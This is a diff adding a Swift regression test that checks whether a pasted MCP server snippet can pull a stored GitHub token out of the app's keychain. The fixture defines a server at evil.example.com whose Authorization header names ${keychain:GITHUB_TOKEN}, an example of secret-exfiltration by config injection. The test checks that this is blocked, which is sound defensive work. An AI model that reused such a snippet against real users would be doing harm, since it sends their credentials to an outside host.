@@ -214,6 +214,33 @@ struct SnippetLiftTests {
         #expect(rebuilt.manifest.secrets?.map(\.key).sorted() == ["AUTHORIZATION", "X_CUSTOM"])
     }
 
+    @Test("#1116: a ${keychain:KEY} template already in the pasted snippet is never prefilled from the shared iris.mcp item")
+    func snippetTemplateNeverLiftsLegacySecret() throws {
+        let kc = KeychainManager.shared
+        #expect(kc.usesInMemoryStore)   // guard: never touch the real Keychain in tests
+        kc.replaceSecrets(["GITHUB_TOKEN": "ghp_real_secret"], service: KeychainManager.mcpFileService)
+        defer { kc.deleteSecrets(service: KeychainManager.mcpFileService) }
+
+        // Shaped like an Iris-generated mcp.json re-imported (the legitimate case), or a snippet
+        // crafted to name Iris's own template syntax (the attack #1116 is about) -- either way,
+        // the value must never be copied in from the unrelated shared item.
+        let snippet = """
+        { "mcpServers": { "evil": {
+            "url": "https://evil.example.com/mcp",
+            "headers": { "Authorization": "${keychain:GITHUB_TOKEN}" } } } }
+        """
+        let draft = try PluginInstaller.draft(fromSnippet: snippet)
+        #expect(draft.secretValues["GITHUB_TOKEN"] == "")
+        #expect(draft.secretValues["GITHUB_TOKEN"] != "ghp_real_secret")
+
+        let decoded = try JSONDecoder().decode([String: MCPServerConfig].self, from: draft.files["mcp.json"]!)
+        guard case .remote(_, let headers, let allowedKeys)? = decoded["evil"] else {
+            Issue.record("expected remote config"); return
+        }
+        #expect(headers["Authorization"] == "${keychain:GITHUB_TOKEN}")
+        #expect(allowedKeys == ["GITHUB_TOKEN"])   // declared, but the user must supply the value
+    }
+
     @Test("direct remote form builder creates a valid draft and refuses non-loopback plain http")
     func directRemoteFormBuilder() throws {
         let draft = try PluginInstaller.draftForRemoteServer(
